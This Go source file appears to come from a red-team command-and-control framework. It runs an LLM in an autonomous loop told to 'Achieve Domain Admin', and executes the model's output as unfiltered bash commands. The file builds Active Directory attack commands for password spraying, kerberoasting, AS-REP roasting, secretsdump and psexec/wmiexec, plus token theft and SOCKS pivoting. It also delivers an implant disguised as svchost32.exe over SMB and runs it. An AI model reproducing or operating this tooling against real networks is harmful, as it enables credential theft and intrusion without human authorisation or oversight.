package client

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
	"strings"
	"sync"
	"time"

	"redteam/server"
)

type aiGUIEvent struct {
	Type    string `json:"type"`
	Content string `json:"content"`
	Iter    int    `json:"iter,omitempty"`
}

type aiGUISession struct {
	mu          sync.Mutex
	running     bool
	stepMode    bool
	stepCh      chan string
	stopCh      chan struct{}
	out         chan aiGUIEvent
	client      *Client
	agentID     string
	builtAgent  string // path to last built agent.exe on the C2 server
	listenerURL string // e.g. "http://10.7.10.165:8080"
}

var globalAISess struct {
	mu sync.Mutex
	s  *aiGUISession
}

func newAIGUISession(c *Client) *aiGUISession {
	return &aiGUISession{
		client: c,
		out:    make(chan aiGUIEvent, 500),
		stopCh: make(chan struct{}),
		stepCh: make(chan string, 1),
	}
}

func (s *aiGUISession) emit(evType, content string, iter ...int) {
	ev := aiGUIEvent{Type: evType, Content: content}
	if len(iter) > 0 {
		ev.Iter = iter[0]
	}
	select {
	case s.out <- ev:
	default:
	}
}

func (s *aiGUISession) execAgent(taskType, args string) string {
	if s.agentID == "" {
		return "[no agent selected]"
	}
	tid, err := s.client.QueueTask(s.agentID, taskType, args, nil)
	if err != nil {
		return "[queue error: " + err.Error() + "]"
	}
	r, err := s.client.WaitResult(s.agentID, tid, 5*time.Minute)
	if err != nil {
		return "[timeout: " + err.Error() + "]"
	}
	out := r.Output
	if r.Error != "" {
		if out != "" {
			out += "\n"
		}
		out += "[err] " + r.Error
	}
	return out
}

func execLocalTool(cmdLine string) string {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()
	cmd := exec.CommandContext(ctx, "bash", "-c", cmdLine)
	out, _ := cmd.CombinedOutput()
	return string(out)
}

func parseAIArgs(args []string) (ip, domain, user, pass, hash string, rest []string) {
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-d":
			i++
			if i < len(args) {
				domain = args[i]
			}
		case "-u":
			i++
			if i < len(args) {
				user = args[i]
			}
		case "-p":
			i++
			if i < len(args) {
				pass = args[i]
			}
		case "-H":
			i++
			if i < len(args) {
				hash = args[i]
			}
		default:
			if ip == "" && !strings.HasPrefix(args[i], "-") {
				ip = args[i]
			} else {
				rest = append(rest, args[i])
			}
		}
	}
	return
}

func buildImpacketTarget(domain, user, pass, hash, ip string) string {
	var sb strings.Builder
	if domain != "" {
		sb.WriteString(domain + "/")
	}
	sb.WriteString(user)
	if hash != "" {
		sb.WriteString("@" + ip + " -hashes " + hash)
		return sb.String()
	}
	if pass != "" {
		sb.WriteString(":" + pass)
	}
	sb.WriteString("@" + ip)
	return sb.String()
}

func translateTool(parts []string) (string, bool) {
	if len(parts) == 0 {
		return "", false
	}
	tool := parts[0]
	args := parts[1:]
	ip, domain, user, pass, hash, rest := parseAIArgs(args)
	target := buildImpacketTarget(domain, user, pass, hash, ip)
	restStr := strings.Join(rest, " ")

	switch tool {
	case "scan":
		flags := ""
		for i, a := range args {
			if a == "-p" && i+1 < len(args) {
				flags = "-p " + args[i+1]
				break
			}
		}
		return fmt.Sprintf("nmap -sV -sC -T4 --open %s %s 2>&1 | head -150", ip, flags), true
	case "enum":
		base := ip
		if user != "" {
			base = fmt.Sprintf("%s -u '%s' -p '%s'", ip, user, pass)
		}
		return fmt.Sprintf("nxc smb %s 2>&1; nxc ldap %s 2>&1", base, base), true
	case "spray":
		uFlag := fmt.Sprintf("-u '%s'", user)
		if strings.HasSuffix(user, ".txt") {
			uFlag = "-U " + user
		}
		return fmt.Sprintf("nxc smb %s %s -p '%s' --continue-on-success 2>&1", ip, uFlag, pass), true
	case "asrep":
		uFile := user
		if restStr != "" {
			uFile = restStr
		}
		return fmt.Sprintf("impacket-GetNPUsers %s/ -dc-ip %s -usersfile '%s' -no-pass -format hashcat 2>&1", domain, ip, uFile), true
	case "kerberoast":
		return fmt.Sprintf("impacket-GetUserSPNs %s -request -outputfile /tmp/kerb_$(date +%%s).txt 2>&1", target), true
	case "secretsdump":
		return fmt.Sprintf("impacket-secretsdump %s 2>&1", target), true
	case "bloodhound":
		return fmt.Sprintf("bloodhound-python -d '%s' -u '%s' -p '%s' -dc %s -c All --zip 2>&1", domain, user, pass, ip), true
	case "wmiexec":
		if restStr != "" {
			return fmt.Sprintf("impacket-wmiexec %s '%s' 2>&1", target, restStr), true
		}
		return fmt.Sprintf("impacket-wmiexec %s 2>&1", target), true
	case "psexec":
		return fmt.Sprintf("impacket-psexec %s %s 2>&1", target, restStr), true
	case "smbexec":
		return fmt.Sprintf("impacket-smbexec %s %s 2>&1", target, restStr), true
	case "lookupsid":
		t := ip + "/"
		if user != "" {
			t = target
		}
		return fmt.Sprintf("impacket-lookupsid %s 2>&1", t), true
	case "getadusers":
		allFlag := ""
		for _, r2 := range rest {
			if r2 == "-all" {
				allFlag = "-all"
			}
		}
		return fmt.Sprintf("impacket-GetADUsers %s %s 2>&1", allFlag, target), true
	case "finddelegation":
		return fmt.Sprintf("impacket-findDelegation %s 2>&1", target), true
	case "getlaps":
		return fmt.Sprintf("nxc ldap %s -u '%s' -p '%s' -d '%s' -M laps 2>&1", ip, user, pass, domain), true
	case "gettgt":
		if hash != "" {
			return fmt.Sprintf("impacket-getTGT %s/%s -hashes %s -dc-ip %s 2>&1", domain, user, hash, ip), true
		}
		return fmt.Sprintf("impacket-getTGT %s/%s:'%s' -dc-ip %s 2>&1", domain, user, pass, ip), true
	case "getst":
		return fmt.Sprintf("impacket-getST %s %s 2>&1", target, restStr), true
	case "dumpntlminfo":
		return fmt.Sprintf("nxc smb %s 2>&1", ip), true
	case "rpcdump":
		return fmt.Sprintf("impacket-rpcdump %s 2>&1", ip), true
	case "dacledit":
		return fmt.Sprintf("dacledit.py %s %s 2>&1", target, restStr), true
	case "rbcd":
		return fmt.Sprintf("rbcd.py %s %s 2>&1", target, restStr), true
	case "addcomputer":
		compName, compPass := "", ""
		for i2, r2 := range rest {
			if r2 == "-name" && i2+1 < len(rest) {
				compName = rest[i2+1]
			}
			if r2 == "-cpass" && i2+1 < len(rest) {
				compPass = rest[i2+1]
			}
		}
		return fmt.Sprintf("impacket-addcomputer %s -computer-name '%s' -computer-pass '%s' 2>&1", target, compName, compPass), true
	case "changepasswd":
		newPass := ""
		for i2, r2 := range rest {
			if r2 == "-np" && i2+1 < len(rest) {
				newPass = rest[i2+1]
			}
		}
		return fmt.Sprintf("impacket-changepasswd %s -newpass '%s' 2>&1", target, newPass), true
	case "certipy":
		return fmt.Sprintf("certipy-ad %s 2>&1", strings.Join(args, " ")), true
	case "mssqlclient":
		return fmt.Sprintf("impacket-mssqlclient %s %s 2>&1", target, restStr), true
	case "samrdump":
		return fmt.Sprintf("impacket-samrdump %s 2>&1", target), true
	}
	return "", false
}

func (s *aiGUISession) execCmd(cmdLine string) string {
	cmdLine = strings.TrimSpace(cmdLine)
	if cmdLine == "" {
		return ""
	}
	parts := strings.Fields(cmdLine)
	if len(parts) == 0 {
		return ""
	}
	cmd := parts[0]
	args := parts[1:]

	switch cmd {
	case "agents":
		raw, err := s.client.Agents()
		if err != nil {
			return "[error: " + err.Error() + "]"
		}
		var agents []*server.Agent
		json.Unmarshal(raw, &agents)
		var sb strings.Builder
		for _, a := range agents {
			status := "active"
			if server.IsStale(a) || !a.Active {
				status = "stale"
			}
			id := a.ID
			if len(id) > 8 {
				id = id[:8]
			}
			fmt.Fprintf(&sb, "%s  %s@%s  %s  %s  %s\n", id, a.Username, a.Hostname, a.IP, a.Transport, status)
		}
		return sb.String()

	case "use":
		if len(args) == 0 {
			return "[error: use <id>]"
		}
		s.agentID = args[0]
		return "[agent selected: " + args[0] + "]"

	// ── listener management ──────────────────────────────────────────────
	case "listener":
		if len(args) == 0 {
			return "[error: listener start <proto> <port> | listener list]"
		}
		switch args[0] {
		case "list":
			raw, err := s.client.Jobs()
			if err != nil {
				return "[error: " + err.Error() + "]"
			}
			return string(raw)
		case "start":
			if len(args) < 3 {
				return "[error: listener start <proto> <port>]"
			}
			proto := args[1]
			port := 0
			fmt.Sscanf(args[2], "%d", &port)
			jobID, err := s.client.StartListener(proto, port)
			if err != nil {
				return "[error starting listener: " + err.Error() + "]"
			}
			return fmt.Sprintf("[listener started: %s port %d job_id=%d]", proto, port, jobID)
		}
		return "[error: listener start <proto> <port> | listener list]"

	// ── build agent payload ──────────────────────────────────────────────
	// Usage: build http <kali_ip> [port] [sleep]
	case "build":
		if len(args) < 2 {
			return "[error: build <transport> <c2_ip> [port] [sleep_sec]]"
		}
		transport := args[0]
		c2ip := args[1]
		port := 8080
		sleepSec := 5
		if len(args) >= 3 {
			fmt.Sscanf(args[2], "%d", &port)
		}
		if len(args) >= 4 {
			fmt.Sscanf(args[3], "%d", &sleepSec)
		}
		serverURL := fmt.Sprintf("%s://%s:%d", transport, c2ip, port)
		s.listenerURL = serverURL
		cfg := map[string]any{
			"server_url": serverURL,
			"transport":  transport,
			"sleep_sec":  sleepSec,
			"jitter_pct": 20,
		}
		result, err := s.client.Build(cfg)
		if err != nil {
			return "[error building agent: " + err.Error() + "]"
		}
		// Store the exe path for later delivery
		if exePath, ok := result["exe"]; ok && exePath != "" {
			s.builtAgent = exePath
			return fmt.Sprintf("[agent built: %s | url: %s]", exePath, serverURL)
		}
		// Try other common response keys
		for _, k := range []string{"path", "file", "output"} {
			if v, ok := result[k]; ok && v != "" {
				s.builtAgent = v
				return fmt.Sprintf("[agent built: %s | url: %s]", v, serverURL)
			}
		}
		return fmt.Sprintf("[build result: %v]", result)

	// ── deliver agent to target ──────────────────────────────────────────
	// Usage: deliver <target_ip> -u <user> [-p <pass>|-H <hash>] [-d <domain>]
	case "deliver":
		if s.builtAgent == "" {
			return "[error: no agent built yet — run 'build http <kali_ip> <port>' first]"
		}
		if len(args) == 0 {
			return "[error: deliver <target_ip> -u <user> [-p <pass>|-H <hash>] [-d <domain>]]"
		}
		_, domain, user, pass, hash, _ := parseAIArgs(args)
		targetIP := args[0]
		remotePath := `C:\Windows\Temp\svchost32.exe`

		var uploadCmd, execCmd string
		if hash != "" {
			uploadCmd = fmt.Sprintf(
				"nxc smb %s -u '%s' -H '%s' -d '%s' --put-file '%s' '%s' 2>&1",
				targetIP, user, hash, domain, s.builtAgent, remotePath)
			execCmd = fmt.Sprintf(
				"impacket-wmiexec %s/%s@%s -hashes %s '%s' 2>&1",
				domain, user, targetIP, hash, remotePath)
		} else {
			uploadCmd = fmt.Sprintf(
				"nxc smb %s -u '%s' -p '%s' -d '%s' --put-file '%s' '%s' 2>&1",
				targetIP, user, pass, domain, s.builtAgent, remotePath)
			execCmd = fmt.Sprintf(
				"impacket-wmiexec %s/%s:'%s'@%s '%s' 2>&1",
				domain, user, pass, targetIP, remotePath)
		}

		out1 := execLocalTool(uploadCmd)
		if strings.Contains(strings.ToLower(out1), "error") && !strings.Contains(out1, "SUCCEED") {
			return fmt.Sprintf("[upload result]\n%s", out1)
		}
		// Small delay to ensure file is written before execution
		time.Sleep(2 * time.Second)
		out2 := execLocalTool(execCmd)
		return fmt.Sprintf("[upload]\n%s\n[execute]\n%s", out1, out2)

	// ── wait for new agent beacon ─────────────────────────────────────────
	// Usage: wait_agent [timeout_seconds]
	case "wait_agent":
		timeout := 120
		if len(args) > 0 {
			fmt.Sscanf(args[0], "%d", &timeout)
		}
		// Snapshot current agent IDs
		raw0, _ := s.client.Agents()
		var before []*server.Agent
		json.Unmarshal(raw0, &before)
		knownIDs := map[string]bool{}
		for _, a := range before {
			knownIDs[a.ID] = true
		}
		deadline := time.Now().Add(time.Duration(timeout) * time.Second)
		for time.Now().Before(deadline) {
			select {
			case <-s.stopCh:
				return "[stopped]"
			default:
			}
			time.Sleep(8 * time.Second)
			raw, err := s.client.Agents()
			if err != nil {
				continue
			}
			var current []*server.Agent
			json.Unmarshal(raw, &current)
			for _, a := range current {
				if !knownIDs[a.ID] && a.Active {
					s.agentID = a.ID[:8]
					return fmt.Sprintf("[new agent connected: %s@%s (%s) — agent selected]",
						a.Username, a.Hostname, a.IP)
				}
			}
		}
		return fmt.Sprintf("[wait_agent: no new beacon after %ds]", timeout)
	}

	if s.agentID != "" {
		switch cmd {
		case "shell":
			return s.execAgent("SHELL", strings.Join(args, " "))
		case "ls":
			path := ""
			if len(args) > 0 {
				path = strings.Join(args, " ")
			}
			return s.execAgent("LS", path)
		case "pwd":
			return s.execAgent("PWD", "")
		case "cd":
			return s.execAgent("CD", strings.Join(args, " "))
		case "cat":
			return s.execAgent("CAT", strings.Join(args, " "))
		case "ps":
			return s.execAgent("PS", "")
		case "env":
			return s.execAgent("ENV", "")
		case "mkdir":
			return s.execAgent("MKDIR", strings.Join(args, " "))
		case "rm":
			return s.execAgent("RM", strings.Join(args, " "))
		case "download":
			if len(args) == 0 {
				return "[error: download <path>]"
			}
			return s.execAgent("DOWNLOAD", fmt.Sprintf(`{"path":%q}`, args[0]))
		case "token":
			if len(args) == 0 {
				return "[error: token whoami|steal|make|drop]"
			}
			switch args[0] {
			case "whoami":
				return s.execAgent("TOKEN_WHOAMI", "")
			case "steal":
				if len(args) < 2 {
					return "[error: token steal <pid>]"
				}
				return s.execAgent("TOKEN_STEAL", args[1])
			case "make":
				if len(args) < 3 {
					return "[error: token make <user> <pass>]"
				}
				return s.execAgent("TOKEN_MAKE", args[1]+" "+args[2])
			case "drop":
				return s.execAgent("TOKEN_DROP", "")
			}
		case "socks":
			if len(args) == 0 {
				return "[error: socks <port>]"
			}
			return s.execAgent("SOCKS_START", args[0])
		}
	}

	if strings.HasPrefix(cmdLine, "!") {
		return execLocalTool(strings.TrimSpace(cmdLine[1:]))
	}
	if toolCmd, ok := translateTool(parts); ok {
		return execLocalTool(toolCmd)
	}
	return execLocalTool(cmdLine)
}

func (s *aiGUISession) run(target, domain, model, ollamaURL, provider, apiKey string) {
	defer func() {
		s.mu.Lock()
		s.running = false
		s.mu.Unlock()
		s.emit("stopped", "Sesión terminada.")
	}()

	raw, _ := s.client.Agents()
	var agents []*server.Agent
	json.Unmarshal(raw, &agents)
	for _, a := range agents {
		if a.Active && !server.IsStale(a) {
			s.agentID = a.ID
			break
		}
	}

	agentNote := "No active agent — local tools only."
	if s.agentID != "" {
		for _, a := range agents {
			if a.ID == s.agentID {
				agentNote = fmt.Sprintf("Active agent: %s@%s (ID: %s, transport: %s)",
					a.Username, a.Hostname, s.agentID[:8], a.Transport)
			}
		}
	}

	msgs := []ollamaMsg{
		{Role: "system", Content: aiAutoSystemPrompt},
		{Role: "user", Content: fmt.Sprintf(
			"TARGET IP: %s\nDOMAIN: %s\n%s\n\nStart the pentest. Achieve Domain Admin.",
			target, domain, agentNote,
		)},
	}

	s.emit("phase", fmt.Sprintf("AI Pentest started — target: %s  domain: %s  model: %s", target, domain, model))

	for iter := 1; iter <= aiMaxIter; iter++ {
		select {
		case <-s.stopCh:
			return
		default:
		}

		s.emit("thinking", fmt.Sprintf("Iteration %d/%d — querying AI...", iter, aiMaxIter), iter)

		var response string
		var err error
		if provider == "ollama" {
			// Stream tokens so the operator sees the model think in real-time.
			// We batch tokens into ~80-char chunks to avoid flooding the SSE channel.
			var batch strings.Builder
			response, err = ollamaChatStream(ollamaURL, model, msgs, func(tok string, think bool) {
				batch.WriteString(tok)
				// Flush on newline or when batch is long enough
				if strings.ContainsAny(tok, "\n") || batch.Len() > 80 {
					evType := "token"
					if think {
						evType = "token_think"
					}
					select {
					case <-s.stopCh:
						return
					default:
						s.emit(evType, batch.String(), iter)
					}
					batch.Reset()
				}
			})
			// Flush remainder
			if batch.Len() > 0 {
				s.emit("token", batch.String(), iter)
			}
		} else {
			response, err = aiChat(provider, ollamaURL, apiKey, model, msgs)
		}
		if err != nil {
			s.emit("error", "AI error: "+err.Error())
			return
		}
		s.emit("stream_end", "", iter)

		// Extract <think> block for collapsible display
		thinkMatches := reThinkBlock.FindStringSubmatch(response)
		cleanResponse := reThinkBlock.ReplaceAllString(response, "")
		if len(thinkMatches) > 1 {
			s.emit("think_block", strings.TrimSpace(thinkMatches[1]), iter)
		}

		reasoning := strings.TrimSpace(reCmdTag.ReplaceAllString(cleanResponse, ""))
		reasoning = strings.TrimSpace(reDoneTag.ReplaceAllString(reasoning, ""))
		if reasoning != "" {
			s.emit("reason", reasoning, iter)
		}

		if reDoneTag.MatchString(response) {
			s.emit("done", response)
			return
		}

		matches := reCmdTag.FindAllStringSubmatch(response, -1)
		if len(matches) == 0 {
			msgs = append(msgs, ollamaMsg{Role: "assistant", Content: response})
			msgs = append(msgs, ollamaMsg{Role: "user", Content: "Continue. Execute a command toward Domain Admin."})
			continue
		}

		msgs = append(msgs, ollamaMsg{Role: "assistant", Content: response})
		var resultBuf strings.Builder

		for _, m := range matches {
			cmdLine := strings.TrimSpace(m[1])
			if cmdLine == "" {
				continue
			}
			select {
			case <-s.stopCh:
				return
			default:
			}

			if s.stepMode {
				s.emit("step", cmdLine, iter)
				select {
				case action := <-s.stepCh:
					if action == "skip" {
						s.emit("result", "[skipped by operator]", iter)
						fmt.Fprintf(&resultBuf, "CMD: %s\nOUT: [skipped]\n---\n", cmdLine)
						continue
					}
				case <-s.stopCh:
					return
				case <-time.After(5 * time.Minute):
					s.emit("error", "Step timeout.")
					return
				}
			}

			s.emit("cmd", cmdLine, iter)
			out := s.execCmd(cmdLine)
			out = truncateOut(out, aiMaxOut)
			if out == "" {
				out = "(no output)"
			}
			s.emit("result", out, iter)
			fmt.Fprintf(&resultBuf, "CMD: %s\nOUT:\n%s\n---\n", cmdLine, out)
		}

		msgs = append(msgs, ollamaMsg{
			Role:    "user",
			Content: resultBuf.String() + "\nAnalyze results and proceed toward Domain Admin.",
		})
	}
	s.emit("phase", fmt.Sprintf("Max iterations (%d) reached.", aiMaxIter))
}

func (p *guiProxy) handleAIPentest(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	switch r.Method {
	case http.MethodGet:
		globalAISess.mu.Lock()
		running := globalAISess.s != nil && globalAISess.s.running
		globalAISess.mu.Unlock()
		json.NewEncoder(w).Encode(map[string]bool{"running": running})
	case http.MethodPost:
		var req struct {
			Action    string `json:"action"`
			Target    string `json:"target"`
			Domain    string `json:"domain"`
			Model     string `json:"model"`
			OllamaURL string `json:"ollama_url"`
			Provider  string `json:"provider"`   // "ollama" | "claude"
			APIKey    string `json:"api_key"`    // Anthropic API key (Claude only)
			StepMode  bool   `json:"step_mode"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, err.Error(), 400)
			return
		}
		if req.Action == "stop" {
			globalAISess.mu.Lock()
			if globalAISess.s != nil {
				select {
				case <-globalAISess.s.stopCh:
				default:
					close(globalAISess.s.stopCh)
				}
				// Mark as not running immediately so a new Start is allowed
				// without waiting for the goroutine to fully exit.
				globalAISess.s.running = false
				globalAISess.s = nil
			}
			globalAISess.mu.Unlock()
			json.NewEncoder(w).Encode(map[string]string{"status": "stopped"})
			return
		}
		globalAISess.mu.Lock()
		if globalAISess.s != nil && globalAISess.s.running {
			globalAISess.mu.Unlock()
			http.Error(w, `{"error":"already running"}`, 400)
			return
		}
		provider := req.Provider
		if provider == "" {
			provider = "ollama"
		}
		ollamaURL := resolveOllamaURL(req.OllamaURL)
		model := req.Model
		if model == "" {
			if provider == "claude" {
				model = "claude-sonnet-4-6"
			} else {
				model = "" // will be resolved from available models below
			}
		}
		if provider == "claude" && req.APIKey == "" {
			globalAISess.mu.Unlock()
			http.Error(w, `{"error":"api_key requerida para Claude"}`, 400)
			return
		}
		if provider == "ollama" {
			available := ollamaListModels(ollamaURL)
			if len(available) == 0 {
				globalAISess.mu.Unlock()
				http.Error(w, `{"error":"Ollama no disponible o sin modelos. Ejecuta: ollama list"}`, 400)
				return
			}
			found := false
			for _, m := range available {
				if m == model {
					found = true
					break
				}
			}
			if !found {
				model = available[0]
			}
		}
		sess := newAIGUISession(p.c)
		sess.running = true
		sess.stepMode = req.StepMode
		globalAISess.s = sess
		globalAISess.mu.Unlock()
		go sess.run(req.Target, req.Domain, model, ollamaURL, provider, req.APIKey)
		json.NewEncoder(w).Encode(map[string]string{"status": "started"})
	default:
		http.Error(w, "method not allowed", 405)
	}
}

func (p *guiProxy) handleAIStream(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "streaming unsupported", 500)
		return
	}
	globalAISess.mu.Lock()
	sess := globalAISess.s
	globalAISess.mu.Unlock()
	if sess == nil {
		fmt.Fprintf(w, "data: {\"type\":\"error\",\"content\":\"no session\"}\n\n")
		flusher.Flush()
		return
	}
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case ev, ok := <-sess.out:
			if !ok {
				return
			}
			data, _ := json.Marshal(ev)
			fmt.Fprintf(w, "data: %s\n\n", data)
			flusher.Flush()
		case <-ticker.C:
			fmt.Fprintf(w, ": heartbeat\n\n")
			flusher.Flush()
		case <-r.Context().Done():
			return
		}
	}
}

func (p *guiProxy) handleAIStep(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", 405)
		return
	}
	var req struct {
		Action string `json:"action"`
	}
	json.NewDecoder(r.Body).Decode(&req)
	globalAISess.mu.Lock()
	sess := globalAISess.s
	globalAISess.mu.Unlock()
	if sess == nil {
		http.Error(w, `{"error":"no session"}`, 400)
		return
	}
	select {
	case sess.stepCh <- req.Action:
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
	default:
		http.Error(w, `{"error":"no step pending"}`, 400)
	}
}

// handleOllamaURL returns the effective Ollama URL as the Go client sees it
// (respects OLLAMA_HOST env var). The browser uses this to pre-fill the URL field.
func (p *guiProxy) handleOllamaURL(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"url": resolveOllamaURL("")})
}

// handleOllamaModels proxies the Ollama model list through the backend so the
// browser does not need a direct connection to localhost:11434.
func (p *guiProxy) handleOllamaModels(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	ollamaURL := resolveOllamaURL(r.URL.Query().Get("url"))
	models := ollamaListModels(ollamaURL)
	if models == nil {
		models = []string{}
	}
	json.NewEncoder(w).Encode(map[string]any{"models": models, "url": ollamaURL})
}

// handleAIConsoleChat streams LLM tokens for the AI Console feature.
// Accepts POST {provider, model, api_key, ollama_url, messages}.
func (p *guiProxy) handleAIConsoleChat(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		Provider  string      `json:"provider"`
		Model     string      `json:"model"`
		APIKey    string      `json:"api_key"`
		OllamaURL string      `json:"ollama_url"`
		Messages  []ollamaMsg `json:"messages"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request: "+err.Error(), http.StatusBadRequest)
		return
	}
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "streaming unsupported", http.StatusInternalServerError)
		return
	}
	_, err := aiChatStream(req.Provider, req.OllamaURL, req.APIKey, req.Model, req.Messages, func(tok string) {
		b, _ := json.Marshal(map[string]string{"tok": tok})
		fmt.Fprintf(w, "data: %s\n\n", b)
		flusher.Flush()
	})
	if err != nil {
		b, _ := json.Marshal(map[string]string{"err": err.Error()})
		fmt.Fprintf(w, "data: %s\n\n", b)
	}
	fmt.Fprintf(w, "data: [DONE]\n\n")
	flusher.Flush()
}

// handleAIConsoleTask queues a task on an agent and waits for the result.
// Accepts POST {agent_id, type, args}. Returns {ok, output, error}.
func (p *guiProxy) handleAIConsoleTask(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		AgentID string `json:"agent_id"`
		Type    string `json:"type"`
		Args    string `json:"args"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	if req.AgentID == "" || req.Type == "" {
		http.Error(w, "agent_id and type required", http.StatusBadRequest)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	tid, err := p.c.QueueTask(req.AgentID, req.Type, req.Args, nil)
	if err != nil {
		json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": err.Error()})
		return
	}
	res, err := p.c.WaitResult(req.AgentID, tid, 5*time.Minute)
	if err != nil {
		json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": err.Error()})
		return
	}
	out := res.Output
	if res.Error != "" {
		if out != "" {
			out += "\n"
		}
		out += "[err] " + res.Error
	}
	json.NewEncoder(w).Encode(map[string]any{"ok": true, "output": out})
}
